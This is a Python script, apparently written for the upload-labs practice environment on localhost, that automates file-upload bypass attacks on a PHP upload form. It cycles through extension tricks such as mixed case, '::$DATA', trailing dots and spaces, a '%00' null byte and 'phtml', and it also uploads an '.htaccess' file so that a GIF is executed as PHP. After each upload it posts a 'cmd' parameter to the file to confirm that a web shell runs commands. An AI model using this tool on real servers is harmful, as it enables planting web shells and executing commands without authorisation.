"""
可能要更新索引 post_files[key0]
配置 xpath 提取上期文件路径
"""
from urllib.parse import urlparse

from requests_html import HTMLSession


def _get_host(url):
    parsed_url = urlparse(url)
    host_with_protocol = parsed_url.scheme + "://" + parsed_url.netloc
    return host_with_protocol


def extract_upload_url(regexp):
    return regexp


url = 'http://localhost/Pass-08/index.php'
host = _get_host(url)
upload_folder = 'upload'
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080', }
# proxies = {}
headers = {}
files = {'upload_file': ['file.pHP', 'filedata_or_fp', 'image/jpeg']}
data = {'submit': '上传'}
xpath_upload_url = "//div[@id='img']/img/@src"


class FuzzUpload:
    upload_url = ''

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.requests = HTMLSession()
        self.requests.headers = headers

    def send_request(self, url, files, data):
        post_data = data.copy()
        post_files = files.copy()
        res = self.requests.post(url, data=post_data, files=post_files, proxies=proxies)

        if xpath_upload_url:
            xpath_lst = res.html.xpath(xpath_upload_url)
            if xpath_lst:
                self.upload_url = xpath_lst[0]
            else:
                print('没有上传成功')
        return res

    def check(self, shell_path, check_str='Hello 123'):
        tmp_url = self.get_upload_url(shell_path)

        data = {'cmd': f'echo "{check_str}";'}
        res = self.requests.post(tmp_url, data=data, proxies=proxies, verify=False)

        if check_str in res.text:
            surl = self.get_final_url_path(shell_path)
            print('Done: ' + shell_path)
            print(f'url: {surl}')
            return True
        self.upload_url = None
        return False

    def get_final_url_path(self, shell_path):
        r = url.rsplit('/', 1)[0]
        shell_url = r + '/' + shell_path
        return shell_url

    def get_upload_url(self, shell_path):
        url = f'{host}/{upload_folder}/{shell_path}'
        return url

    def _update_file_fp(self, file_path, filename='file.pHP'):
        f = open(file_path, 'rb')
        post_files = files.copy()
        # post_files = {'upload_file': ('file.pHP', f, 'image/jpeg')} 更新中间的f值为实际文件 fp
        key0 = list(post_files.keys())[0]
        post_files[key0] = [filename, f, 'image/jpeg']  # 需要更新 1: f 索引为实际索引
        return post_files

    def upload0_normal_check(self):
        file_path = 'check.gif'
        post_files = self._update_file_fp(file_path, filename='check.gif')
        post_data = data.copy()
        res = self.send_request(url=url, files=post_files, data=post_data)
        self.check(self.upload_url or file_path, 'GIF89a')

    def upload1_basic(self):
        file_path = 'basic.PHp'
        post_files = self._update_file_fp(file_path)
        post_data = data.copy()
        try:
            res = self.send_request(url=url, files=post_files, data=post_data)
            self.check(self.upload_url or file_path)
        except Exception as e:
            print('error ', file_path)

    def upload2_php5_phtml(self):
        filename = 'basic.PHp'
        ext_lst = 'PHP,Php::$DATA,pHP,pHP.,pHP ,pHP. .,pHP3,pHP4,pHP5,pHP%00.jpg,phtml'.split(',')  # "basic.pHP .jpg"
        for ext in ext_lst:
            newname = f'basic.{ext}'
            post_files = self._update_file_fp(filename, filename=newname)
            post_data = data.copy()
            res = self.send_request(url=url, files=post_files, data=post_data)
            if self.check(self.upload_url or newname):
                return
        return

    def upload3_htaccess(self):
        file_path = '.htaccess'
        post_files = self._update_file_fp(file_path, filename=file_path)
        post_data = data.copy()
        # upload .htaccess
        self.send_request(url=url, files=post_files, data=post_data)
        post_files = self._update_file_fp('basic.gif', 'basic.gif')
        res = self.send_request(url=url, files=post_files, data=post_data)
        self.check('basic.gif')


if __name__ == '__main__':
    fuzz_upload = FuzzUpload()
    fuzz_upload.upload0_normal_check()
    fuzz_upload.upload1_basic()
    fuzz_upload.upload2_php5_phtml()
    fuzz_upload.upload3_htaccess()
